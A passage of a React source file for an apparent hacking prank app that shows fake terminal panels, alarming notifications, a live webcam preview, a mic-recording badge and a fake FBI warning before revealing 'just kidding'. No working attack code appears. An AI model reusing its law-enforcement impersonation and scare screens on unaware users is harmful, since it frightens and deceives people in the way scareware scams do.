          position: "relative",
        }}
      >
        {PANEL_TITLES.map((title, i) => (
          <div key={title} style={{ position: "relative", overflow: "hidden" }}>
            {i === 0 ? (
              <PoliceTrackingPanel />
            ) : i === 1 ? (
              <LocationPanel />
            ) : i === 5 ? (
              <GraphicPanel />
            ) : (
              <TermPanel
                title={title}
                panelIndex={i}
                paused={paused}
                injectLine={injectedLines[i]}
              />
            )}
          </div>
        ))}
      </main>

      {/* ── Bottom Status Bar ── */}
      <footer
        data-ocid="status.panel"
        style={{
          height: "26px",
          flexShrink: 0,
          borderTop: "1px solid oklch(0.85 0.22 145 / 0.4)",
          background: "oklch(0.05 0.008 145)",
          display: "flex",
          alignItems: "center",
          paddingInline: "12px",
          gap: "16px",
          overflow: "hidden",
        }}
      >
        <span
          style={{
            color: "oklch(0.85 0.22 145)",
            fontSize: "0.55rem",
            letterSpacing: "0.08em",
            whiteSpace: "nowrap",
            flexShrink: 0,
          }}
        >
          SESSION: {sessionId}
        </span>
        <span
          style={{ color: "oklch(0.85 0.22 145 / 0.3)", fontSize: "0.55rem" }}
        >
          |
        </span>
        <span
          style={{
            color: "oklch(0.56 0.03 145)",
            fontSize: "0.55rem",
            whiteSpace: "nowrap",
            flexShrink: 0,
          }}
        >
          LOCAL: {fakeIp} → REMOTE: {randIp()}
        </span>
        <span
          style={{ color: "oklch(0.85 0.22 145 / 0.3)", fontSize: "0.55rem" }}
        >
          |
        </span>
        <div style={{ flex: 1, overflow: "hidden", position: "relative" }}>
          <div
            style={{
              display: "inline-block",
              animation: paused ? "none" : "scroll-status 30s linear infinite",
              color: "oklch(0.70 0.12 145)",
              fontSize: "0.55rem",
              whiteSpace: "nowrap",
              letterSpacing: "0.06em",
            }}
          >
            {paused
              ? "[ TERMINAL PAUSED — scroll panels with mouse wheel ]"
              : "SCANNING PORTS... BRUTE FORCING SSH... ENUMERATING SUBDOMAINS... EXFILTRATING DATA... INJECTING SHELLCODE... BYPASSING WAF... PRIVILEGE ESCALATION IN PROGRESS... C2 BEACON ACTIVE... LATERAL MOVEMENT DETECTED..."}
          </div>
        </div>
        <span
          style={{
            color: "oklch(0.56 0.03 145)",
            fontSize: "0.55rem",
            whiteSpace: "nowrap",
            flexShrink: 0,
          }}
        >
          {dateStr} {timeStr}
        </span>
      </footer>

      {/* ── Add Message Modal ── */}
      <AnimatePresence>
        {showAddMsg && (
          <motion.div
            key="add-msg"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            style={{
              position: "fixed",
              inset: 0,
              zIndex: 80,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              background: "oklch(0.03 0.005 145 / 0.85)",
            }}
            onClick={(e) => {
              if (e.target === e.currentTarget) setShowAddMsg(false);
            }}
          >
            <motion.div
              initial={{ scale: 0.85, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.85, opacity: 0 }}
              transition={{ type: "spring", stiffness: 260, damping: 20 }}
              style={{
                background: "oklch(0.07 0.012 145)",
                border: "1px solid oklch(0.85 0.22 145 / 0.6)",
                boxShadow: "0 0 40px oklch(0.85 0.22 145 / 0.2)",
                padding: "28px 32px",
                width: "min(520px, 92vw)",
                display: "flex",
                flexDirection: "column",
                gap: "16px",
                maxHeight: "85vh",
                overflowY: "auto",
              }}
            >
              <div
                style={{
                  color: "oklch(0.85 0.22 145)",
                  fontSize: "0.75rem",
                  letterSpacing: "0.2em",
                  fontWeight: "bold",
                  textShadow: "0 0 8px oklch(0.85 0.22 145 / 0.5)",
                }}
              >
                + INJECT CUSTOM MESSAGE
              </div>
              <div
                style={{
                  color: "oklch(0.56 0.03 145)",
                  fontSize: "0.6rem",
                  letterSpacing: "0.08em",
                }}
              >
                {selectedMsgId
                  ? "Saved message selected — INJECT karo ya DELETE karo"
                  : "Message sabhi panels mein inject hoga aur hamesha ke liye save rahega"}
              </div>

              {/* Input Row */}
              <div style={{ display: "flex", gap: "8px" }}>
                <input
                  type="text"
                  value={msgInput}
                  onChange={(e) => {
                    setMsgInput(e.target.value);
                    setSelectedMsgId(null);
                  }}
                  onKeyDown={(e) => {
                    if (e.key === "Enter") handleAddMessage();
                    if (e.key === "Escape") setShowAddMsg(false);
                  }}
                  placeholder="Apna message likho..."
                  data-ocid="add_msg.input"
                  style={{
                    flex: 1,
                    background: selectedMsgId
                      ? "oklch(0.04 0.008 75)"
                      : "oklch(0.04 0.008 145)",
                    border: selectedMsgId
                      ? "1px solid oklch(0.95 0.18 75 / 0.6)"
                      : "1px solid oklch(0.85 0.22 145 / 0.4)",
                    color: selectedMsgId
                      ? "oklch(0.95 0.18 75)"
                      : "oklch(0.85 0.22 145)",
                    fontSize: "0.75rem",
                    letterSpacing: "0.08em",
                    padding: "10px 12px",
                    outline: "none",
                    fontFamily: "inherit",
                    transition: "all 0.2s",
                  }}
                />
                {selectedMsgId ? (
                  <button
                    type="button"
                    data-ocid="add_msg.delete_button"
                    onClick={() => {
                      deleteMessage(selectedMsgId);
                      setMsgInput("");
                      setSelectedMsgId(null);
                    }}
                    style={{
                      padding: "10px 16px",
                      border: "1px solid oklch(0.62 0.22 25 / 0.9)",
                      background: "oklch(0.62 0.22 25 / 0.15)",
                      color: "oklch(0.72 0.22 25)",
                      fontSize: "0.65rem",
                      letterSpacing: "0.15em",
                      cursor: "pointer",
                      fontFamily: "inherit",
                      boxShadow: "0 0 10px oklch(0.62 0.22 25 / 0.4)",
                      whiteSpace: "nowrap",
                      transition: "all 0.2s",
                    }}
                  >
                    ✕ DELETE
                  </button>
                ) : (
                  <button
                    type="button"
                    data-ocid="add_msg.submit_button"
                    onClick={handleAddMessage}
                    style={{
                      padding: "10px 16px",
                      border: "1px solid oklch(0.70 0.18 290 / 0.8)",
                      background: "oklch(0.70 0.18 290 / 0.1)",
                      color: "oklch(0.70 0.18 290)",
                      fontSize: "0.65rem",
                      letterSpacing: "0.15em",
                      cursor: "pointer",
                      fontFamily: "inherit",
                      boxShadow: "0 0 10px oklch(0.70 0.18 290 / 0.3)",
                      whiteSpace: "nowrap",
                    }}
                  >
                    INJECT
                  </button>
                )}
              </div>

              {/* Saved Messages List */}
              {savedMessages.length > 0 && (
                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "6px",
                  }}
                >
                  <div
                    style={{
                      color: "oklch(0.85 0.22 145 / 0.6)",
                      fontSize: "0.55rem",
                      letterSpacing: "0.15em",
                      textTransform: "uppercase",
                      borderBottom: "1px solid oklch(0.85 0.22 145 / 0.2)",
                      paddingBottom: "6px",
                    }}
                  >
                    Saved Messages ({savedMessages.length}) — text par click
                    karo select karne ke liye
                  </div>
                  {savedMessages.map((msg) => {
                    const isSelected = selectedMsgId === msg.id;
                    return (
                      <div
                        key={msg.id}
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: "8px",
                          padding: "6px 10px",
                          background: isSelected
                            ? "oklch(0.08 0.015 75)"
                            : "oklch(0.04 0.008 145)",
                          border: isSelected
                            ? "1px solid oklch(0.95 0.18 75 / 0.7)"
                            : "1px solid oklch(0.95 0.18 75 / 0.25)",
                          boxShadow: isSelected
                            ? "0 0 8px oklch(0.95 0.18 75 / 0.2)"
                            : "none",
                          transition: "all 0.15s",
                        }}
                      >
                        <span
                          style={{
                            fontSize: "0.6rem",
                            color: isSelected
                              ? "oklch(0.95 0.18 75)"
                              : "oklch(0.95 0.18 75 / 0.6)",
                          }}
                        >
                          {isSelected ? "▶" : "○"}
                        </span>
                        <button
                          type="button"
                          onClick={() => {
                            setMsgInput(msg.text);
                            setSelectedMsgId(msg.id);
                          }}
                          title="Click karo select karne ke liye"
                          style={{
                            flex: 1,
                            background: "none",
                            border: "none",
                            textAlign: "left",
                            color: isSelected
                              ? "oklch(0.95 0.18 75)"
                              : "oklch(0.80 0.14 75)",
                            fontSize: "0.65rem",
                            letterSpacing: "0.05em",
                            overflow: "hidden",
                            textOverflow: "ellipsis",
                            whiteSpace: "nowrap",
                            cursor: "pointer",
                            fontWeight: isSelected ? "bold" : "normal",
                            textDecoration: isSelected ? "none" : "underline",
                            textDecorationStyle: "dotted",
                            textDecorationColor: "oklch(0.95 0.18 75 / 0.4)",
                            transition: "all 0.15s",
                            fontFamily: "inherit",
                            padding: 0,
                          }}
                          onMouseEnter={(e) => {
                            if (!isSelected) {
                              e.currentTarget.style.color =
                                "oklch(0.95 0.18 75)";
                            }
                          }}
                          onMouseLeave={(e) => {
                            if (!isSelected) {
                              e.currentTarget.style.color =
                                "oklch(0.80 0.14 75)";
                            }
                          }}
                        >
                          {msg.text}
                        </button>
                        <button
                          type="button"
                          onClick={() => {
                            deleteMessage(msg.id);
                            if (selectedMsgId === msg.id) {
                              setMsgInput("");
                              setSelectedMsgId(null);
                            }
                          }}
                          title="Delete karo"
                          style={{
                            background: "none",
                            border: "1px solid oklch(0.62 0.22 25 / 0.5)",
                            color: "oklch(0.62 0.22 25)",
                            fontSize: "0.6rem",
                            cursor: "pointer",
                            padding: "2px 7px",
                            letterSpacing: "0.1em",
                            fontFamily: "inherit",
                            flexShrink: 0,
                          }}
                        >
                          ✕
                        </button>
                      </div>
                    );
                  })}
                </div>
              )}

              <div
                style={{
                  display: "flex",
                  justifyContent: "flex-end",
                }}
              >
                <button
                  type="button"
                  onClick={() => {
                    setShowAddMsg(false);
                    setSelectedMsgId(null);
                    setMsgInput("");
                  }}
                  style={{
                    padding: "8px 20px",
                    border: "1px solid oklch(0.56 0.03 145 / 0.5)",
                    background: "none",
                    color: "oklch(0.56 0.03 145)",
                    fontSize: "0.65rem",
                    letterSpacing: "0.15em",
                    cursor: "pointer",
                    fontFamily: "inherit",
                  }}
                >
                  CLOSE
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── Flash Message Overlay ── */}
      <AnimatePresence>
        {flashMsg && (
          <motion.div
            key={`flash-${flashMsg.text}`}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.15 }}
            data-ocid="flash.modal"
            style={{
              position: "fixed",
              inset: 0,
              zIndex: 50,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              background:
                flashMsg.color === "red"
                  ? "oklch(0.03 0.005 25 / 0.92)"
                  : "oklch(0.03 0.005 145 / 0.92)",
              flexDirection: "column",
              gap: "16px",
            }}
          >
            <motion.div
              initial={{ scale: 0.7, opacity: 0 }}
              animate={{ scale: [0.7, 1.08, 1], opacity: 1 }}
              transition={{ duration: 0.4, times: [0, 0.5, 1] }}
              style={{
                color:
                  flashMsg.color === "red"
                    ? "oklch(0.62 0.22 25)"
                    : "oklch(0.88 0.22 145)",
                textShadow:
                  flashMsg.color === "red"
                    ? "0 0 40px oklch(0.62 0.22 25 / 0.9), 0 0 80px oklch(0.62 0.22 25 / 0.5)"
                    : "0 0 40px oklch(0.88 0.22 145 / 0.9), 0 0 80px oklch(0.88 0.22 145 / 0.5)",
                fontSize: "clamp(2.5rem, 8vw, 6rem)",
                fontWeight: "bold",
                letterSpacing: "0.25em",
                textAlign: "center",
                lineHeight: 1,
              }}
            >
              {flashMsg.text}
            </motion.div>
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: [0, 1, 0] }}
              transition={{ duration: 0.8, delay: 0.5, times: [0, 0.5, 1] }}
              style={{
                color:
                  flashMsg.color === "red"
                    ? "oklch(0.62 0.22 25 / 0.7)"
                    : "oklch(0.70 0.18 145 / 0.7)",
                fontSize: "clamp(0.8rem, 2vw, 1.2rem)",
                letterSpacing: "0.35em",
                textTransform: "uppercase",
              }}
            >
              ■ ■ ■ &nbsp; CYBER ATTACK v4.2.0 &nbsp; ■ ■ ■
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── Easter Egg Overlay ── */}
      <AnimatePresence>
        {showEasterEgg && (
          <motion.div
            key="easter-egg"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.4 }}
            data-ocid="easter_egg.modal"
            style={{
              position: "fixed",
              inset: 0,
              zIndex: 100,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              background: "oklch(0.03 0.005 248 / 0.97)",
              flexDirection: "column",
              gap: "24px",
              padding: "24px",
            }}
          >
            <motion.div
              initial={{ scale: 0, rotate: -10 }}
              animate={{ scale: 1, rotate: 0 }}
              transition={{ type: "spring", stiffness: 200, damping: 15 }}
              style={{
                fontSize: "clamp(3rem, 12vw, 8rem)",
                textAlign: "center",
              }}
            >
              😄
            </motion.div>

            <motion.h1
              initial={{ y: 30, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.2 }}
              style={{
                color: "oklch(0.85 0.22 145)",
                textShadow: "0 0 20px oklch(0.85 0.22 145 / 0.6)",
                fontSize: "clamp(1.5rem, 5vw, 3rem)",
                fontWeight: "bold",
                letterSpacing: "0.15em",
                textAlign: "center",
              }}
            >
              JUST KIDDING! 😂
            </motion.h1>

            <motion.p
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.35 }}
              style={{
                color: "oklch(0.70 0.12 145)",
                fontSize: "clamp(0.8rem, 2.5vw, 1.2rem)",
                letterSpacing: "0.1em",
                textAlign: "center",
                maxWidth: "500px",
              }}
            >
              Yeh sirf ek prank hai! 🎭
              <br />
              <span
                style={{ color: "oklch(0.56 0.03 145)", fontSize: "0.85em" }}
              >
                Koi hacking nahi ho rahi — sab fake hai! 😜
              </span>
            </motion.p>

            <motion.p
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.5 }}
              style={{
                color: "oklch(0.56 0.03 145)",
                fontSize: "0.75rem",
                letterSpacing: "0.2em",
                textAlign: "center",
              }}
            >
              — Hacking Prank App —
            </motion.p>

            <motion.div
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.6 }}
              style={{
                display: "flex",
                gap: "16px",
                flexWrap: "wrap",
                justifyContent: "center",
              }}
            >
              <button
                type="button"
                data-ocid="easter_egg.restart_button"
                onClick={restart}
                style={{
                  padding: "10px 28px",
                  border: "1px solid oklch(0.85 0.22 145 / 0.7)",
                  background: "oklch(0.08 0.012 145)",
                  color: "oklch(0.85 0.22 145)",
                  fontSize: "0.75rem",
                  letterSpacing: "0.2em",
                  cursor: "pointer",
                  textTransform: "uppercase",
                  boxShadow: "0 0 10px oklch(0.85 0.22 145 / 0.3)",
                  transition: "all 0.2s",
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.background =
                    "oklch(0.85 0.22 145 / 0.15)";
                  e.currentTarget.style.boxShadow =
                    "0 0 20px oklch(0.85 0.22 145 / 0.5)";
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.background = "oklch(0.08 0.012 145)";
                  e.currentTarget.style.boxShadow =
                    "0 0 10px oklch(0.85 0.22 145 / 0.3)";
                }}
              >
                ▶ RESTART PRANK
              </button>
              <button
                type="button"
                data-ocid="easter_egg.close_button"
                onClick={() => setShowEasterEgg(false)}
                style={{
                  padding: "10px 28px",
                  border: "1px solid oklch(0.62 0.22 25 / 0.6)",
                  background: "oklch(0.08 0.01 25)",
                  color: "oklch(0.62 0.22 25)",
                  fontSize: "0.75rem",
                  letterSpacing: "0.2em",
                  cursor: "pointer",
                  textTransform: "uppercase",
                  transition: "all 0.2s",
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.background =
                    "oklch(0.62 0.22 25 / 0.15)";
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.background = "oklch(0.08 0.01 25)";
                }}
              >
                ✕ CLOSE
              </button>
            </motion.div>

            <motion.p
              initial={{ opacity: 0 }}
              animate={{ opacity: 0.4 }}
              transition={{ delay: 0.8 }}
              style={{
                position: "absolute",
                bottom: "16px",
                color: "oklch(0.56 0.03 145)",
                fontSize: "0.6rem",
                letterSpacing: "0.08em",
              }}
            >
              Press ESC or click CLOSE to go back to hacking
            </motion.p>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── Scary Effects JSX ── */}

      {/* Red Flash */}
      <AnimatePresence>
        {redFlash && (
          <motion.div
            key="redflash"
            initial={{ opacity: 0 }}
            animate={{ opacity: 0.35 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.1 }}
            style={{
              position: "fixed",
              inset: 0,
              background: "red",
              zIndex: 9990,
              pointerEvents: "none",
            }}
          />
        )}
      </AnimatePresence>

      {/* System Alert Banner */}
      <AnimatePresence>
        {showBanner && (
          <motion.div
            key="banner"
            initial={{ y: -60 }}
            animate={{ y: 0 }}
            exit={{ y: -60 }}
            transition={{ duration: 0.3, ease: "easeOut" }}
            style={{
              position: "fixed",
              top: 0,
              left: 0,
              right: 0,
              zIndex: 9995,
              background: "oklch(0.38 0.22 25)",
              color: "white",
              fontFamily: "'JetBrains Mono', monospace",
              fontSize: "0.85rem",
              fontWeight: 700,
              letterSpacing: "0.12em",
              textAlign: "center",
              padding: "10px 16px",
              borderBottom: "2px solid oklch(0.6 0.25 25)",
              animation: "blink-warning 0.5s step-end infinite",
            }}
          >
            ⚠ CRITICAL ALERT: Data exfiltration complete — 1.2 GB transferred ⚠
          </motion.div>
        )}
      </AnimatePresence>

      {/* Scary Popup Notifications — Windows 10/11 Style */}
      <div
        style={{
          position: "fixed",
          top: 0,
          right: 0,
          bottom: 0,
          pointerEvents: "none",
          zIndex: 9996,
        }}
      >
        <AnimatePresence>
          {scaryPopups.map((popup, index) => (
            <motion.div
              key={popup.id}
              initial={{ x: 400, opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              exit={{ x: 400, opacity: 0 }}
              transition={{ duration: 0.3, ease: [0.22, 1, 0.36, 1] }}
              style={{
                position: "absolute",
                right: "16px",
                top: `${80 + index * 110}px`,
                width: "360px",
                background: "rgba(32, 32, 32, 0.97)",
                border: "1px solid rgba(255,255,255,0.08)",
                borderRadius: "8px",
                boxShadow:
                  "0 8px 32px rgba(0,0,0,0.5), 0 2px 8px rgba(0,0,0,0.3)",
                fontFamily: "-apple-system, 'Segoe UI', system-ui, sans-serif",
                pointerEvents: "auto",
                overflow: "hidden",
              }}
            >
              {/* Header row: icon + app name + time */}
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "8px",
                  padding: "10px 12px 6px 12px",
                }}
              >
                <span style={{ fontSize: "14px", lineHeight: 1 }}>
                  {popup.icon ?? "⚠️"}
                </span>
                <span
                  style={{
                    color: "rgba(255,255,255,0.5)",
                    fontSize: "11px",
                    fontWeight: 400,
                    flex: 1,
                    letterSpacing: "0.01em",
                  }}
                >
                  {popup.app ?? "System"}
                </span>
                <span
                  style={{
                    color: "rgba(255,255,255,0.35)",
                    fontSize: "11px",
                    fontWeight: 400,
                  }}
                >
                  just now
                </span>
              </div>
              {/* Notification body */}
              <div style={{ padding: "0 12px 10px 12px" }}>
                <div
                  style={{
                    color: "#ffffff",
                    fontSize: "13px",
                    fontWeight: 600,
                    lineHeight: 1.3,
                    marginBottom: "3px",
                  }}
                >
                  {popup.title}
                </div>
                <div
                  style={{
                    color: "#aaaaaa",
                    fontSize: "12px",
                    fontWeight: 400,
                    lineHeight: 1.4,
                  }}
                >
                  {popup.detail}
                </div>
              </div>
              {/* Progress bar — auto dismiss indicator */}
              <div
                style={{
                  width: "100%",
                  height: "2px",
                  background: "rgba(255,255,255,0.06)",
                }}
              >
                <motion.div
                  initial={{ width: "100%" }}
                  animate={{ width: "0%" }}
                  transition={{ duration: 4.0, ease: "linear" }}
                  style={{
                    height: "100%",
                    background: "rgba(255,255,255,0.2)",
                  }}
                />
              </div>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>

      {/* Camera Feed */}
      <AnimatePresence>
        {showCamera && (
          <motion.div
            key="camera"
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.8 }}
            transition={{ duration: 0.4 }}
            style={{
              position: "fixed",
              bottom: "20px",
              right: "16px",
              zIndex: 9997,
              border: "2px solid red",
              borderRadius: "4px",
              overflow: "hidden",
              boxShadow: "0 0 24px rgba(255,0,0,0.7)",
              background: "#000",
              width: "160px",
              height: "120px",
            }}
          >
            <video
              ref={videoRef}
              autoPlay
              muted
              playsInline
              style={{ width: "100%", height: "100%", objectFit: "cover" }}
            />
            <div
              style={{
                position: "absolute",
                top: "4px",
                left: "6px",
                color: "red",
                fontSize: "0.55rem",
                fontFamily: "'JetBrains Mono', monospace",
                fontWeight: 700,
                letterSpacing: "0.06em",
                animation: "blink-warning 0.8s step-end infinite",
              }}
            >
              ● WEBCAM ACCESSED
            </div>
            <div
              style={{
                position: "absolute",
                top: "4px",
                right: "6px",
                color: "red",
                fontSize: "0.55rem",
                fontFamily: "'JetBrains Mono', monospace",
                fontWeight: 700,
                animation: "blink-warning 1s step-end infinite",
              }}
            >
              REC ●
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Camera Blocked Message */}
      <AnimatePresence>
        {cameraBlocked && (
          <motion.div
            key="camblocked"
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 30 }}
            transition={{ duration: 0.3 }}
            style={{
              position: "fixed",
              bottom: "20px",
              right: "16px",
              zIndex: 9997,
              background: "oklch(0.1 0.02 25)",
              border: "1px solid oklch(0.5 0.22 25)",
              borderRadius: "4px",
              padding: "10px 14px",
              fontFamily: "'JetBrains Mono', monospace",
              fontSize: "0.65rem",
              color: "oklch(0.7 0.22 25)",
              maxWidth: "260px",
              boxShadow: "0 0 16px oklch(0.5 0.22 25 / 0.5)",
            }}
          >
            ⚠ WEBCAM ACCESS BLOCKED — switching to alternate method...
          </motion.div>
        )}
      </AnimatePresence>

      {/* FBI Warning Screen */}
      <AnimatePresence>
        {showFBIWarning && (
          <motion.div
            key="fbi-warning"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.2 }}
            style={{
              position: "fixed",
              inset: 0,
              zIndex: 99999,
              background: "rgba(0,0,0,0.92)",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              fontFamily: "'JetBrains Mono', monospace",
              animation: "fbi-pulse 1s ease-in-out infinite",
            }}
          >
            <div
              style={{
                background: "#00008B",
                border: "6px solid #FFD700",
                borderRadius: "4px",
                padding: "32px 40px",
                maxWidth: "640px",
                width: "90%",
                textAlign: "center",
                position: "relative",
                overflow: "hidden",
              }}
            >
              {/* Scanlines overlay */}
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  pointerEvents: "none",
                  backgroundImage:
                    "repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.15) 2px, rgba(0,0,0,0.15) 4px)",
                  animation: "scanlines 0.08s linear infinite",
                  zIndex: 1,
                }}
              />
              <div style={{ position: "relative", zIndex: 2 }}>
                <div
                  style={{
                    color: "#FFD700",
                    fontSize: "1.1rem",
                    fontWeight: 900,
                    letterSpacing: "0.2em",
                    marginBottom: "8px",
                  }}
                >
                  ⚖ FEDERAL BUREAU OF INVESTIGATION ⚖
                </div>
                <div
                  style={{
                    background: "#FFD700",
                    color: "#00008B",
                    fontSize: "2.2rem",
                    fontWeight: 900,
                    letterSpacing: "0.25em",
                    padding: "8px 20px",
                    marginBottom: "16px",
                    display: "inline-block",
                  }}
                >
                  FBI WARNING
                </div>
                <div
                  style={{
                    width: "100%",
                    height: "2px",
                    background: "#FFD700",
                    marginBottom: "16px",
                  }}
                />
                <div
                  style={{
                    color: "#FF4444",
                    fontSize: "0.75rem",
                    fontWeight: 700,
                    letterSpacing: "0.1em",
                    marginBottom: "12px",
                    animation: "blink-warning 0.7s step-end infinite",
                  }}
                >
                  ⚠ THIS DEVICE HAS BEEN FLAGGED ⚠
                </div>
                <div
                  style={{
                    color: "#CCCCCC",
                    fontSize: "0.68rem",
                    letterSpacing: "0.06em",
                    lineHeight: 1.8,
                    marginBottom: "16px",
                  }}
                >
                  <div>
                    Unauthorized network activity detected on this system.
                  </div>
                  <div>
                    All data, keystrokes, and communications are being
                    monitored.
                  </div>
                  <div style={{ marginTop: "8px", color: "#AAAAAA" }}>
                    CASE NO: FBI-
                    {(Math.floor(Math.random() * 9000000) + 1000000).toString()}
                    -{String.fromCharCode(65 + Math.floor(Math.random() * 26))}
                    {String.fromCharCode(65 + Math.floor(Math.random() * 26))}
                  </div>
                  <div style={{ color: "#AAAAAA" }}>
                    SUSPECT IP: {Math.floor(Math.random() * 255)}.
                    {Math.floor(Math.random() * 255)}.
                    {Math.floor(Math.random() * 255)}.
                    {Math.floor(Math.random() * 255)}
                  </div>
                </div>
                <div
                  style={{
                    width: "100%",
                    height: "2px",
                    background: "#FFD700",
                    marginBottom: "12px",
                  }}
                />
                <div
                  style={{
                    color: "#FF4444",
                    fontSize: "0.7rem",
                    fontWeight: 700,
                    letterSpacing: "0.08em",
                  }}
                >
                  YOU ARE BEING MONITORED — DO NOT ATTEMPT TO CLOSE THIS PAGE
                </div>
                <div
                  style={{
                    color: "#888",
                    fontSize: "0.58rem",
                    marginTop: "10px",
                    letterSpacing: "0.04em",
                  }}
                >
                  Pursuant to 18 U.S.C. § 2701 — Electronic Communications
                  Privacy Act
                </div>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Mic Recording Indicator */}
      <AnimatePresence>
        {showMicRecording && (
          <motion.div
            key="mic-recording"
            initial={{ opacity: 0, x: -60 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -60 }}
            transition={{ duration: 0.35, ease: "easeOut" }}
            style={{
              position: "fixed",
              bottom: "20px",
              left: "16px",
              zIndex: 9998,
              background: "oklch(0.08 0.02 0)",
              border: "2px solid #FF3333",
              borderRadius: "6px",
              padding: "10px 14px",
              fontFamily: "'JetBrains Mono', monospace",
              boxShadow: "0 0 20px rgba(255,51,51,0.5)",
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              gap: "6px",
              minWidth: "120px",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
              <span style={{ fontSize: "1.1rem" }}>🎤</span>
              <div
                style={{ display: "flex", alignItems: "center", gap: "4px" }}
              >
                <span
                  style={{
                    width: "7px",
                    height: "7px",
                    borderRadius: "50%",
                    background: "#FF3333",
                    display: "inline-block",
                    animation: "blink-warning 0.6s step-end infinite",
                  }}
                />
                <span
                  style={{
                    color: "#FF3333",
                    fontSize: "0.62rem",
                    fontWeight: 700,
                    letterSpacing: "0.12em",
                  }}
                >
                  RECORDING
                </span>
              </div>
            </div>
            <div
              style={{
                display: "flex",
                alignItems: "flex-end",
                gap: "3px",
                height: "18px",
              }}
            >
              {[0, 1, 2, 3, 4].map((i) => (
                <div
                  key={i}
                  style={{
                    width: "5px",
                    background: "#FF3333",
                    borderRadius: "2px",
                    height: "4px",
                    animation: `mic-bar ${0.4 + i * 0.1}s ease-in-out infinite`,
                    animationDelay: `${i * 0.07}s`,
                  }}
                />
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── Virus Scan Overlay ── */}
      <AnimatePresence>
        {showVirusScan && (
          <VirusScanOverlay
            phase={showVirusScan}
            progress={scanProgress}
            files={scanFiles}
            threatCount={threatCount}
            filesScanned={filesScanned}
            onClose={() => setShowVirusScan(null)}
          />
        )}
      </AnimatePresence>

      {/* ── Police Tracking Map Overlay ── */}
      <AnimatePresence>
        {showPoliceTracking && (
          <PoliceTrackingOverlay
            onClose={() => {
              setShowPoliceTracking(false);
              if (policeCloseCallbackRef.current)
                policeCloseCallbackRef.current();
            }}
          />
        )}
      </AnimatePresence>

      {/* ── Countdown Timer Overlay ── */}
      <AnimatePresence>
        {showCountdown && (
          <CountdownOverlay onClose={() => setShowCountdown(false)} />
        )}
      </AnimatePresence>

      {/* Screenshot Capture Overlay */}
      <AnimatePresence>
        {screenshotPhase && screenshotData && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.3 }}
            style={{
              position: "fixed",
              inset: 0,
              zIndex: 10001,
              background: "#000",
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              justifyContent: "center",
              fontFamily: "monospace",
            }}
          >
            {/* Screenshot image */}
            <img
              src={screenshotData}
              alt="captured"
              style={{
                position: "absolute",
                inset: 0,
                width: "100%",
                height: "100%",
                objectFit: "cover",
                opacity: screenshotPhase === "upload" ? 0.35 : 0.85,
                transition: "opacity 0.5s",
              }}
            />
            {/* Scan lines */}
            <div
              style={{
                position: "absolute",
                inset: 0,
                background:
                  "repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,255,70,0.04) 3px, rgba(0,255,70,0.04) 4px)",
                pointerEvents: "none",
              }}
            />
            {screenshotPhase === "capture" && (
              <>
                {/* Flash effect */}
                <motion.div
                  initial={{ opacity: 1 }}
                  animate={{ opacity: 0 }}
                  transition={{ duration: 0.4 }}
                  style={{
                    position: "absolute",
                    inset: 0,
                    background: "#fff",
                    pointerEvents: "none",
                  }}
                />
                {/* Corner brackets */}
                {["top-left", "top-right", "bottom-left", "bottom-right"].map(
                  (corner) => (
                    <div
                      key={corner}
                      style={{
                        position: "absolute",
                        [corner.includes("top") ? "top" : "bottom"]: 40,
                        [corner.includes("left") ? "left" : "right"]: 40,
                        width: 40,
                        height: 40,
                        borderTop: corner.includes("top")
                          ? "3px solid #00FF46"
                          : "none",
                        borderBottom: corner.includes("bottom")
                          ? "3px solid #00FF46"
                          : "none",
                        borderLeft: corner.includes("left")
                          ? "3px solid #00FF46"
                          : "none",
